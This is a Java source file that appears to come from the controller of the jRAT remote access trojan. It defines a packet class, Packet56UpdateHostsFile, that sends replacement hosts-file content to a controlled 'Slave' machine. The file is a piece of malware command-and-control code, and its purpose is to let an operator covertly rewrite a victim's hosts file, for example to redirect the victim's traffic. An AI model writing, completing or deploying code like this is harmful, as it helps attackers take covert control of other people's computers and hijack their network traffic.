package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet56UpdateHostsFile extends AbstractOutgoingPacket {

	private String content;

	public Packet56UpdateHostsFile(String content) {
		this.content = content;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(content);
	}

	@Override
	public short getPacketId() {
		return 56;
	}

}
